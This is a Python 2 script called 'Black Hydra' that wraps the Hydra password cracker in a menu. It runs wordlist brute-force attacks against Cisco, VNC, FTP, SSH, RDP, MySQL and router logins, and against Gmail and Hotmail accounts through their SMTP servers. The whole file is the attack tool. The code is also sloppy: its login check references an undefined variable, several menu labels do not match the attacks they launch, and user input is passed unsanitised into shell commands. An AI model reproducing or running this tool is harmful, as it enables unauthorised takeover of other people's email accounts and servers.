#!/usr/bin/python
"""
This program is just a small program to shorten brute force sessions on hydra :)
But to be more satisfying results of the brute force. You better interact directly with hydra,
without having to use this black hydra console first: ').
If you find any errors in running our program. Can chat via facebook :).
Hydra is needed for the process of this program :).
"""
import sys, os, time

# Restart ####################
def restart_program():
   python = sys.executable
   os.execl(python, python, * sys.argv)
   curdir = os.getcwd()
##############################

username = raw_input("Masukan Username Anda :")
password = raw_input("Masukan Password Anda :")
if(username=='Ghostman' and Password=='Gans'):
	print 'Anda Telah Login....'

else:

    print "Hubungi Saya Jika Anda Tidak Tahu +1 920 777 4277"
os.system("clear")

print"    )      )  (      (                     (                        (        )   (               "
print" ( /(   ( /(  )\ )   )\ )    (         (   )\ )         *   )       )\ )  ( /(   )\ )   (        "
print" )\())  )\())(()/(  (()/(    )\      ( )\ (()/(    (  ` )  /( (    (()/(  )\()) (()/(   )\   (   "
print" ((_)\  ((_)\  /(_))  /(_))((((_)(    )((_) /(_))   )\  ( )(_)))\    /(_))((_)\   /(_))(((_)  )\ "
print"_((_)__ ((_)(_))_  (_))   )\ _ )\  ((_)_ (_))  _ ((_)(_(_())((_)  (_))_|  ((_) (_))  )\___ ((_) )"
print"| || |\ \ / / |   \ | _ \  (_)_\(_)  | _ )| _ \| | | ||_   _|| __| | |_   / _ \ | _ \((/ __|| __|"
print"| __ | \ V /  | |) ||   /   / _ \    | _ \|   /| |_| |  | |  | _|  | __| | (_) ||   / | (__ | _| "
print"|_||_|  |_|   |___/ |_|_\  /_/ \_\   |___/|_|_\ \___/   |_|  |___| |_|    \___/ |_|_\  \___||___|"
                                                                                                 
print "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
print "     			       Author: GH05TM4N --- Version 1.0"
print "    			  o=={:::::::::> Black Hydra  <::::::::::}==o"
print "      				  ~ Thanks to MUDASHR HACKS ~ "
print "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
print
print "            			  <===|[ Brute Force ]|===>"
print
print "  [1] Cisco "
print "  [2] VNC "
print "  [3] FTP"
print "  [4] Gmail"
print "  [5] SSH"
print "  [6] Yahoo Mail"
print "  [7] Hotmail"
print "  [8] Router Speedy" 
print "  [9] MySQL         "
print
print " [0] Exit"
print
bhydra = raw_input("[*] B-Hydra > ")

if bhydra == '1' or bhydra == '1':
  print
  print "           <:xxxxxxxxxxxxxxxxxxx|xxxxx}"
  print "           |   Cisco Brute Force      |"
  print "           <:xxxxxxxxxxxxxxxxxxx|xxxxx}"
  print
  print
  iphost = raw_input("[*] IP/Hostname : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -P %s %s cisco" % (word, iphost))
  sys.exit()
  
elif bhydra == '2' or bhydra == '2':
  print
  print "          <:xxxxxxxxxxxxxxxxxxx|xxxxx}"
  print "          |      VNC Brute Force     |"
  print "          <:xxxxxxxxxxxxxxxxxxx|xxxxx}"
  print
  print
  word = raw_input("[*] Wordlist : ")
  iphost = raw_input("[*] IP/Hostname : ")
  os.system("hydra -P %s -e n -t 1 %s vnc -V" % (word, iphost))
  iphost = raw_input("[*] IP/Hostname : ")
  
elif bhydra == '3' or bhydra == '3':
  print
  print "          <:xxxxxxxxxxxxxxxxxxx|xxxxx}"
  print "           |    FTP Brute Force      |"
  print "          <:xxxxxxxxxxxxxxxxxxx|xxxxx}"
  print
  print
  user = raw_input("[*] Nama User : ")
  iphost = raw_input("[*] IP/Hostname : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s %s ftp" % (user, word, iphost))
  sys.exit()
  
elif bhydra == '4' or bhydra == '4':
  print
  print "          <:xxxxxxxxxxxxxxxxxxx|xxxxx}"
  print "           |    Gmail Brute Force    |"
  print "          <:xxxxxxxxxxxxxxxxxxx|xxxxx}"
  print
  print
  email = raw_input("[*] Email : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))
  sys.exit()
  
elif bhydra == '5' or bhydra == '5':
   print
   print "         +<:xxxxxxxxxxxxxxxxxxx|xxxxx}"
   print "            |    SSH Brute Force     |"
   print "         +<:xxxxxxxxxxxxxxxxxxx|xxxxx}"
   print
   print
   user = raw_input("[*] User : ")
   word = raw_input("[*] Wordlist : ")
   iphost = raw_input("[*] IP/Hostname : ")
   os.system("hydra -l %s -P %s %s ssh" % (user, word, iphost))
   sys.exit()
  
elif bhydra == '6' or bhydra == '6':
  print
  print "           <:xxxxxxxxxxxxxxxxxxx|xxxxx}"
  print "            |    Hotmail Brute Force  |"
  print "           <:xxxxxxxxxxxxxxxxxxx|xxxxx}"
  print
  print
  email = raw_input("[*] Email : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s -s 587 smtp.live.com smtp" % (email, word))
  sys.exit()
  
elif bhydra == '7':
	print
	print "        <:xxxxxxxxxxxxxxxxxxx|xxxxx}"
	print "        	|   Router Brute Force    |"
	print "        <:xxxxxxxxxxxxxxxxxxx|xxxxx}"
	print
	print
	user = raw_input("[*] User : ")
	word = raw_input("[*] Wordlist : ")
	iphost = raw_input("[*] IP/Hostname : ")
	os.system("hydra -m / -l %s -P %s %s http-get" % (user, word, iphost))
	sys.exit()
	
elif bhydra == '8':
	print
	print "          <:xxxxxxxxxxxxxxxxxx|xxxxx}"
	print "           |    RDP Brute Force     |"
	print "          <:xxxxxxxxxxxxxxxxxx|xxxxx}"
	print
	print
	user = raw_input("[*] User : ")
	word = raw_input("[*] Wordlist : ")
	iphost = raw_input("[*] IP/Hostname : ")
	os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (user, word, iphost))
	sys.exit()
	
elif bhydra == '9':
	print
	print "        <:xxxxxxxxxxxxxxxxxxx|xxxxx}"
	print "         |    MySQL Brute Force    |"
	print "        <:xxxxxxxxxxxxxxxxxxx|xxxxx}"
	print
	print
	user = raw_input("[*] User : ")
	word = raw_input("[*] Wordlist : ")
	os.system("hydra -t 5 -V -f -l %s -e ns -P %s localhost mysql" % (user, word))
	
elif bhydra == '00' or bhydra == '0':
	print "\n[!] Love you MR.BL4CK.H4TI0 :v ..."
	sys.exit()
	
else:
	print "\n[!] ERROR : Wrong Input"
	time.sleep(1)
	restart_program()
